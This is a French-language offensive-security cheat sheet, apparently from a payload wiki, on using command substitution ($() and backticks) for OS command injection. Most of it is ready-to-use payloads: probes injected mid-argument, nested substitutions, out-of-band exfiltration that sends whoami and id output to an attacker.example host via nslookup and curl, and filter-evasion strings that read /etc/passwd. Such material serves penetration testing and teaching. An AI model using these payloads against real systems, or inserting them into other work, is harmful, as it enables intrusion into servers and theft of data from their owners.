---
title: "Substitution de commandes avec $() et backticks"
description: "Utiliser $(...) et la substitution de commandes par backticks pour exécuter une commande imbriquée et en insérer la sortie dans la ligne de commande courante, fonctionnant même lorsque le point d'injection est au milieu d'un argument."
keywords:
  - injection de commandes
  - substitution de commandes
  - backticks
  - dollar-paren
  - exécution de commande en ligne
  - injection shell
---

# Backticks et $(...)

La substitution de commandes exécute une commande imbriquée et **remplace l'expression par sa sortie standard**, en ligne, avant que la commande externe ne s'exécute. Les deux formes, `$(cmd)` et `` `cmd` ``, font la même chose. Parce que la substitution est développée *à l'intérieur* de la ligne de commande existante, elle se déclenche même lorsque votre entrée arrive au **milieu d'un argument**, là où un séparateur comme `;` ne terminerait pas encore la commande.

## Mécanisme

Le shell évalue `$(...)` et les backticks pendant l'expansion, en substituant la sortie capturée dans la ligne environnante. Pour `ping -c 1 <host>` :

```
127.0.0.1$(id)
127.0.0.1`id`
```

Le shell exécute `id`, puis construit l'argument final à partir de `127.0.0.1` plus la sortie. `ping` reçoit un hôte invalide et échoue, mais `id` s'est déjà exécuté. C'est pourquoi la substitution est la **première sonde** privilégiée : elle ne dépend pas de la terminaison de la commande externe, et un `uid=...` reflété distingue proprement une exécution réelle d'une simple réflexion.

## Injection en milieu d'argument

Les séparateurs doivent se trouver à une frontière d'instruction. La substitution, non : elle se développe là où elle apparaît, elle survit donc à l'intérieur des guillemets et au milieu d'un token :

```
# double-quoted sink: ping -c 1 "$host"
"$(id)"                     # expands inside the quotes, no break-out needed
file_$(whoami)_name         # embedded in a longer argument
http://site/$(id).png       # inside a URL-shaped value
```

Cela rend `$(...)` efficace contre les sinks où la valeur est entourée ou décorée par du texte environnant qu'un payload à base de `;` laisserait syntaxiquement cassé.

## Imbrication et composition

Les substitutions s'imbriquent, ce qui permet de construire des arguments à partir de plusieurs commandes :

```
$(curl http://10.0.0.1/$(whoami))
`echo $(id|base64)`
```

## Utilisation en aveugle hors bande

Lorsque la sortie n'est pas reflétée, insérez la sortie de la commande dans un nom d'hôte pour qu'elle parte via DNS/HTTP vers un serveur que vous contrôlez, confirmation et exfiltration en une seule fois :

```
127.0.0.1; nslookup $(whoami).OOB_ID.attacker.example
127.0.0.1; curl http://OOB_ID.attacker.example/$(id | base64 -w0)
```

La sortie de la commande imbriquée devient le label de sous-domaine, capturé par un serveur d'interaction (Burp Collaborator, `interactsh`).

## Contournement de filtre

La substitution se combine avec les astuces habituelles d'évasion d'espaces et de mots-clés :

```
$(cat${IFS}/etc/passwd)
$(cat$IFS/etc/passwd)
`cat</etc/passwd`
$(/???/c?t /???/p?sswd)        # globbing to avoid literal keywords
```

## Note de plateforme

`$(...)` et les backticks sont des constructions **POSIX/bash**. Le `cmd.exe` de Windows n'a pas d'équivalent, utilisez plutôt l'expansion `%VAR%` et `for /f`, ou passez à PowerShell, où `$(...)` est l'opérateur de substitution (`ping 127.0.0.1; $(whoami)`).

## Outils

- **[commix](https://github.com/commixproject/commix)** : exploitation automatisée des injections de commandes.
- **[Burp Suite](https://portswigger.net/burp)** : Repeater et Collaborator pour la substitution en ligne et la confirmation hors bande.

## Références

- [OWASP: OS Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [PortSwigger Web Security Academy: OS command injection](https://portswigger.net/web-security/os-command-injection)
- [PayloadsAllTheThings: Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
